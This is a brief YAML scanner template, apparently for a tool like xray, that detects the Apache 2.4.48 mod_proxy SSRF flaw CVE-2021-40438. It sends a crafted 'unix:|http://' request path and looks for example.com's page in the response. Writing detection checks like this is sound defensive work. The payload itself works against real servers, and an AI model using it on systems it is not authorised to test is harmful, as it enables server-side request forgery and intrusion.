name: Apache HTTP Server 2.4.48 mod_proxy SSRF CVE-2021-40438
manual: true
query: product="Apache-Web-Server" || server="Apache"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /?unix:|http://www.example.com/
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"Example Domain")
expression: r0()
